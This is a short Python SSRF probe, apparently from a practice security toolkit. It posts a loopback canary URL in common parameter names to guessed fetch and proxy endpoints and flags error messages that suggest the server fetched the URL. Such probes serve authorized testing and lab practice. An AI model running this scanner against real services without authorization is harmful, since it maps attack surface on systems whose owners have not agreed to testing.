#!/usr/bin/env python3
"""SSRF probe — posts candidate URL fields and looks for evidence of server-side fetch."""
import argparse
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, DEFAULT_TARGET_BASE

FIELDS = ["url", "uri", "target", "endpoint", "link", "src", "href", "path", "file", "fetch"]

class SSRFProbe(VibeTool):
    def __init__(self):
        super().__init__("ssrf_probe", "Server-side request forgery probe")

    def run(self, base_url):
        self.banner()
        base = base_url.rstrip("/")
        # Practice target uses /api/fetch or similar; try common shapes
        endpoints = [
            f"{base}/api/fetch",
            f"{base}/api/proxy",
            f"{base}/api/url",
            f"{base}/fetch",
            f"{base}/proxy",
        ]
        canary = "http://127.0.0.1:9/vibe-ssrf-canary"
        hits = []
        for ep in endpoints:
            for field in FIELDS:
                payload = {field: canary}
                status, body, _ = self.safe_request(ep, method="POST", data=payload)
                body = body or ""
                # Evidence: error mentioning the canary, connection refused, or timeout patterns
                if status and (
                    "vibe-ssrf-canary" in body
                    or "Connection refused" in body
                    or "ECONNREFUSED" in body
                    or "failed to fetch" in body.lower()
                    or "ssrf" in body.lower()
                ):
                    hits.append({"endpoint": ep, "field": field, "status": status, "snippet": body[:200]})
                    self.log(f"SSRF HIT on {ep} field={field}", "hack")
        if not hits:
            self.log("No SSRF evidence found (or target not vulnerable)", "info")
        return hits

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=DEFAULT_TARGET_BASE)
    args = p.parse_args()
    SSRFProbe().run(args.url)
